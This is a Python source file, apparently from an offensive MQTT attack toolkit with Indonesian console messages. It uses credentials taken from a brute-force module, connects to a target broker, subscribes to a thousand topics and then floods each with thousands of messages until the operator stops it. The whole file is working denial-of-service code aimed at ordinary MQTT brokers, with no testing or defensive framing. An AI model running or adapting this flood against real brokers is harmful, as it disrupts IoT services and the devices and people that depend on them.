from core.global_state import brute_force_credentials
from colorama import Fore, Style
import paho.mqtt.client as mqtt


def mqtt_subscribe_publish(broker_ip, topic_count=1000, messages_per_topic=3000, qos=0, retain=False, delay=0.005):
    from time import sleep
    print(f"{Fore.YELLOW}[*] Menjalankan Subscribe + Publish Flood ke {broker_ip}...{Style.RESET_ALL}")

    username = brute_force_credentials["username"]
    password = brute_force_credentials["password"]

    client = mqtt.Client()
    if username and password:
        client.username_pw_set(username, password)

    try:
        client.connect(broker_ip, 1883, 60)
        client.loop_start()

        topics = []
        for i in range(topic_count):
            topic = f"flood/topic/{i}"
            client.subscribe(topic)
            topics.append(topic)
            sleep(delay)

        print(f"{Fore.GREEN}[✓] Subscribe {topic_count} topik selesai. Mulai publish...{Style.RESET_ALL}")
        sleep(1)

        for topic in topics:
            for j in range(messages_per_topic):
                payload = f"FLOOD_{topic}_{j}"
                client.publish(topic, payload, qos=qos, retain=retain)

        print(f"{Fore.GREEN}[✓] Publish Flood selesai.{Style.RESET_ALL}")
        input(f"{Fore.YELLOW}Tekan Enter untuk stop & unsubscribe...{Style.RESET_ALL}")
        client.loop_stop()
        client.disconnect()

    except Exception as e:
        print(f"{Fore.RED}[!] Subscribe Flood gagal - {e}{Style.RESET_ALL}")
